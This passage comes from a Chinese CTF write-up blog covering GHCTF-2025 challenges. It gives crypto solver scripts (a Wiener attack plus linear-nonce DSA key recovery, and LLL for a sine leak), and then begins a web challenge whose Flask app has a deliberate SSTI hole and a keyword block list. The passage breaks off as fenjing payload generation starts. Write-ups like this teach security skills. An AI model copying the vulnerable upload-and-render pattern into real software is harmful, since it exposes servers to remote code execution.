class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y= &#125;</span>&quot;</span>)</span><br><span class="line">key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = cipher.encrypt(pad(flag.encode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c_ink= 75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line"><span class="string">e= 97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line"><span class="string">N= 131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line"><span class="string">(r1,s1)= (116607429176396769010327954525649019081679807573, 242024511677350537268048640408155954695100314686)</span></span><br><span class="line"><span class="string">(r2,s2)= (282969697665204582571637561594660002955972273916, 233488943967710383661411268886726155900968304282)</span></span><br><span class="line"><span class="string">g= 113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line"><span class="string">q= 1010682595723348988315901923086844563134854720501</span></span><br><span class="line"><span class="string">p= 117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line"><span class="string">y= 114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line"><span class="string">ciphertext = b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>首先是<strong>维纳攻击</strong>，这个没什么好说的，直接套板子</p><p>然后是<strong>熟悉的DSA</strong>，去年的<strong>国城杯CTF</strong>也接触过一题，不过那题是<strong>关系k攻击(k2=k1^2)，</strong>这题是<strong>线性k攻击(k2=k1+ink)</strong>，还是参考的这篇<a href="http://www.cynthia99.link/index.php/archives/2426/">博客</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(<span class="string">b&#x27;GHCTF-2025&#x27;</span>).digest().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">c_ink = <span class="number">75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line">e = <span class="number">97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line">N = <span class="number">131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line">(r1, s1) = (<span class="number">116607429176396769010327954525649019081679807573</span>,</span><br><span class="line">            <span class="number">242024511677350537268048640408155954695100314686</span>)</span><br><span class="line">(r2, s2) = (<span class="number">282969697665204582571637561594660002955972273916</span>,</span><br><span class="line">            <span class="number">233488943967710383661411268886726155900968304282</span>)</span><br><span class="line">g = <span class="number">113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line">q = <span class="number">1010682595723348988315901923086844563134854720501</span></span><br><span class="line">p = <span class="number">117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line">y = <span class="number">114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span>  <span class="comment"># 分子</span></span><br><span class="line">    denominator = <span class="number">1</span>  <span class="comment"># 分母</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    res = []</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == <span class="number">200</span>:</span><br><span class="line">            res.append(d)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = wienerAttack(e, N)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    ink = <span class="built_in">pow</span>(c_ink, i, N)</span><br><span class="line">    k = (h*r2 - h*r1 + ink*s2*r1) * inverse(s1*r2 - s2*r1, q) % q</span><br><span class="line">    pri = (k*s1 - h) * inverse(r1, q) % q</span><br><span class="line">    key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Sin"><a href="#Sin" class="headerlink" title="Sin"></a>Sin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="built_in">print</span>((<span class="number">2</span> * sin((m := bytes_to_long(<span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span>))) - <span class="number">2</span> * sin(m) * cos(<span class="number">2</span> * m)).n(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">m的值即为flag</span></span><br><span class="line"><span class="string">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这题让我想起了<a href="https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/">SHCTF2024-week3-大学×高中√</a><br>形式稍微不一样，根据三角函数的倍角公式处理一下，得到题目给的值是$4sin^{3}(m)$</p><p>因为我们不知道<code>flag</code>的长度，所以格最后一列的大系数得测试一下(拿<code>SH</code>那题测)，发现大概是<code>flag</code>位数的<strong>两倍</strong>这样就能出</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">leak = <span class="number">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line">leak = (leak / <span class="number">4</span>)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">asin = arcsin(leak)</span><br><span class="line">RF = RealField(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># RealField可以指定精度，RF默认53位</span></span><br><span class="line">pi = RF(pi)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = i*<span class="number">8</span></span><br><span class="line">    k0 = k*<span class="number">2</span></span><br><span class="line">    M = Matrix(QQ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^k0],[<span class="number">0</span>,<span class="number">2</span>^k,<span class="number">2</span>^k0*asin],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^k0*<span class="number">2</span>*pi]])</span><br><span class="line">    m = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="river"><a href="#river" class="headerlink" title="river()"></a>river()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, seed, mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">踩踩背</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask, lfsr=<span class="literal">None</span></span>):</span><br><span class="line">        self.state = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;seed:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.mask_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;mask:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.n = n</span><br><span class="line">        self.lfsr = lfsr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">sum</span>([self.state[i] * self.mask_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n)]) &amp; <span class="number">1</span></span><br><span class="line">        self.state = self.state[<span class="number">1</span>:] + [s]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.lfsr:</span><br><span class="line">            <span class="keyword">if</span> self.lfsr():</span><br><span class="line">                self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">奶龙</span>(<span class="title class_ inherited__">踩踩背</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(n, seed, mask, lfsr=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"><span class="keyword">assert</span> seed.bit_length == mask.bit_length == n</span><br><span class="line">lfsr1 = 奶龙(n, seed, mask)</span><br><span class="line">lfsr2 = 踩踩背(n, seed, mask, lfsr1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mask = <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;output = <span class="subst">&#123;<span class="built_in">sum</span>(lfsr2() &lt;&lt; (n - <span class="number">1</span> - i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># mask = 9494051593829874780</span></span><br><span class="line"><span class="comment"># output = 13799267741689921474</span></span><br><span class="line"><span class="comment"># enc = b&#x27;\x03\xd1#\xb9\xaa5\xff3y\xba\xcb\x91`\x9d4p~9r\xf6i\r\xca\x03dW\xdb\x9a\xd2\xa6\xc6\x85\xfa\x19=b\xb2)5&gt;]\x05,\xeb\xa0\x12\xa9\x1e&#x27; </span></span><br></pre></td></tr></table></figure><p>这题就没仔细研究，不好打，当时看着三解，最后五解，就摆了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>还是Csome那句话，在这CINTA是基础，Sagemath是工具，糖醋小鸡块的blog是弹药库(狗头)</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置信息</span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/uploads&#x27;</span>  <span class="comment"># 上传文件保存目录</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;text&#x27;</span>,<span class="string">&#x27;md&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">MAX_CONTENT_LENGTH = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 限制上传大小为 16MB</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建上传目录（如果不存在）</span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">basedir, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.commonpath([basedir,path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_dangerous_keywords</span>(<span class="params">file_path</span>):</span><br><span class="line">    dangerous_keywords = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = <span class="built_in">str</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> file_content:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 找到危险关键字，返回 True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 文件内容中没有危险关键字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 检查是否有文件被上传</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;未上传文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否选择了文件</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;请选择文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证文件名和扩展名</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># 安全处理文件名</span></span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># 保存文件</span></span><br><span class="line">            save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">            file.save(save_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 返回文件路径（绝对路径）</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: os.path.abspath(save_path)</span><br><span class="line">            &#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;文件类型错误&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET 请求显示上传表单（可选）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 过滤文件名</span></span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> safe_filename:</span><br><span class="line">            abort(<span class="number">400</span>, description=<span class="string">&quot;无效文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 构造完整路径</span></span><br><span class="line">        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 路径安全检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):</span><br><span class="line">            abort(<span class="number">403</span>, description=<span class="string">&quot;禁止访问的路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">            abort(<span class="number">404</span>, description=<span class="string">&quot;文件不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(suffix)</span><br><span class="line">        <span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> contains_dangerous_keywords(file_path):</span><br><span class="line">            <span class="comment"># 删除不安全的文件</span></span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Waf!!!!&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        tmp_str = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span></span><br><span class="line"><span class="string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;footer&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/footer&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;文件查看失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">500</span>, description=<span class="string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误处理（可选）</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><strong>文件上传+SSTI</strong><br>注意因为这里会<code>return</code>，所以我们选择其他后缀<code>ALLOWED_EXTENSIONS = &#123;&#39;txt&#39;, &#39;log&#39;, &#39;text&#39;,&#39;md&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;&#125;</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后我们借助我们的老朋友<strong>fenjing</strong>跑一个<strong>payload</strong>出来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> 